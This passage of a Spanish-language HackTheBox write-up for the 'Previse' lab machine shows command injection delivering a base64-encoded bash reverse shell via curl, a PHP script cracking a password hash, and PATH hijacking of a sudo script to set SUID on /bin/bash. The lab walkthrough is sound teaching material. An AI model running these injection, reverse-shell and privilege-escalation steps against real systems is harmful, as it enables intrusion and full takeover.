+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
+</code></pre></div><p>Ya que podemos poner un punto y coma e inyectar otro comando. Por ejemplo, podemos conectarnos al servidor utilizando una <em>reverse shell</em> con <code>nc</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+</code></pre></div>
+<p>Para realizar esta petición desde <code>curl</code>, es necesario añadir la <em>cookie</em> para mantener la sesión:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://10.10.11.104/logs.php -d <span class=code-dark-yellow>'delim=comma; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span> -H <span class=code-dark-yellow>'Cookie: PHPSESSID=952sbct7uf71fvi95m0p2gvmvi'</span>
+</code></pre></div>
+<p>Y obtenemos una consola de comandos desde <code>nc</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.104.
+Ncat: Connection from 10.10.11.104:55204.
+bash: cannot set terminal process group (1369): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@previse:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@previse:/var/www/html$ ^Z
+[1]  + 70279 suspended  ncat -nlvp 4444
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
+[1]  + 70279 continued  ncat -nlvp 4444
+                                       reset xterm
+www-data@previse:/var/www/html$ export TERM=xterm
+www-data@previse:/var/www/html$ export SHELL=bash
+www-data@previse:/var/www/html$ stty rows 50 columns 158
+</code></pre></div>
+<p>El proceso de registro de una nueva cuenta, acceder como nuevo usuario y realizar la petición con la inyección de comandos se automatizó en un programa en Go llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Previse/foothold.go><code>foothold.go</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Previse#footholdgo>aquí</a>).</p>
+<p>Se puede ejecutar así:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>go</span> run foothold.go 10.10.17.44 4444
+[+] Creating username: 'aBwbf8GZPk', with password: 'LqsgiuEoyV'
+[*] Registration successful
+[*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/
+[!] Sent reverse shell. Check your nc listener
+</code></pre></div>
+<h2 id=movimiento-lateral-al-usuario-m4lwhere>Movimiento lateral al usuario <code>m4lwhere</code></h2>
+<p>Ahora es momento de convertirse en el usuario <code>m4lwhere</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">www-data@previse:/var/www/html$ ls /home
+m4lwhere
+</code></pre></div>
+<p>Podemos utilizar las credenciales de MySQL encontradas en el archivo <code>config.php</code> para conectarnos a la base de datos:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">www-data@previse:/var/www/html$ mysql -u root --password='mySQL_p@ssw0rd!:)'
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| previse            |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use previse;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from accounts;
++-----+----------+----------------------------------+---------------------+
+| id  | username | password                         | created_at          |
++-----+----------+----------------------------------+---------------------+
+| 1   | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+| ... | ...      | ...                              | ...                 |
++-----+----------+----------------------------------+---------------------+
+3 rows in set (0.00 sec)
+</code></pre></div>
+<p>El <em>hash</em> que vemos es algo raro porque contiene un <em>emoji</em> en la parte de la sal del <em>hash</em>. Usar <code>john</code> y <code>hashcat</code> será complicado debido al formato. Aunque puede ser solucionado, lo más rápido es escribir un <em>script</em> en PHP y romper el <em>hash</em> utilizando el mismo procedimiento que se utiliza en el servidor (ver archivos <code>accounts.php</code> o <code>login.php</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+$passHash <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.&#39;</span>;
+
+<span style=color:#66d9ef>if</span> ($file <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#39;rockyou.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)) {
+    <span style=color:#66d9ef>while</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>feof</span>($file)) {
+        $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>fgets</span>($file);
+
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>crypt</span>(<span style=color:#a6e22e>trim</span>($password), <span style=color:#e6db74>&#39;$1$🧂llol$&#39;</span>) <span style=color:#f92672>==</span> $passHash) {
+            <span style=color:#66d9ef>echo</span> $password;
+            <span style=color:#66d9ef>break</span>;
+        }
+    }
+
+    <span style=color:#a6e22e>fclose</span>($file);
+}
+</code></pre></div><p>Y encontramos la contraseña:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>php</span> crack.php
+ilovecody112235!
+</code></pre></div>
+<p>Ahora podemos conectarnos por SSH y conseguir la <em>flag</em> <code>user.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> m4lwhere@10.10.11.104
+m4lwhere@10.10.11.104's password:
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ cat user.txt
+ab438774e2b02effcf6d49753e5c8cb8
+</code></pre></div>
+<h2 id=escalada-de-privilegios>Escalada de privilegios</h2>
+<p>Este usuario puede ejecutar un <em>script</em> en Bash como <code>root</code> mediante <code>sudo</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ sudo -l
+[sudo] password for m4lwhere:
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ ls -l /opt/scripts/access_backup.sh
+-rwxr-xr-x 1 root root 486 Jun  6 12:49 <span class=code-green>/opt/scripts/access_backup.sh</span>
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ cat /opt/scripts/access_backup.sh
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
+</span><span style=color:#75715e></span>
+<span style=color:#75715e># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style=color:#75715e># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style=color:#75715e># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_file_access.gz
+</code></pre></div><p>No tenemos permisos para modificar el archivo. Sin embargo, el comando <code>gzip</code> se está ejecutando con una ruta relativa (al igual que <code>date</code>). Esto es vulnerable a <code>PATH</code> hijacking porque no hay <code>secure_path</code> en la salida de <code>sudo -l</code>.</p>
+<p>Primero, creamos nuestro propio comando <code>gzip</code> en <code>/tmp</code>, como un <em>script</em> de Bash que pone <code>/bin/bash</code> como binario SUID:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > gzip
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ chmod +x gzip
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ cat gzip
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
+</span><span style=color:#75715e></span>chmod u+s /bin/bash
+</code></pre></div><p>Ahora, añadimos <code>/tmp</code> al principio de la variable de entorno <code>PATH</code>, de manera que se encuentre primero el comando malicioso <code>gzip</code> antes que el legítimo:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ export PATH=/tmp:$PATH
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ which gzip
+/tmp/gzip
+</code></pre></div>
+<p>Y finalmente, podemos ejecutar el <em>script</em> de Bash con permisos de <code>root</code>, de manera que <code>/bin/bash</code> se convierte en un binario SUID:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1113504 Jun  6  2019 <span class=code-green>/bin/bash</span>
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ sudo /opt/scripts/access_backup.sh
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 <span class=code-bg-red>/bin/bash</span>
+</code></pre></div>
+<p>Y finalmente, conseguimos acceder como <code>root</code> y leer la <em>flag</em> <code>root.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ bash -p
+bash-4.4# cat /root/root.txt
+3b2115c0ed9ca779182d6d777b1ed40a
+</code></pre></div>
+<div class="mt6 instapaper_ignoref">
+</div>
+</div>
+<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contenidos de este write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
+<li><a href=#enumeración-web>Enumeración web</a></li>
+<li><a href=#registrando-una-nueva-cuenta>Registrando una nueva cuenta</a></li>
+<li><a href=#analizando-código-php>Analizando código PHP</a></li>
+<li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li>
+<li><a href=#movimiento-lateral-al-usuario-m4lwhere>Movimiento lateral al usuario <code>m4lwhere</code></a></li>
+<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+</article>
+</main>
+<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
+<div style=margin-top:8px>
+<div>
+<div>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</body>
+</html>
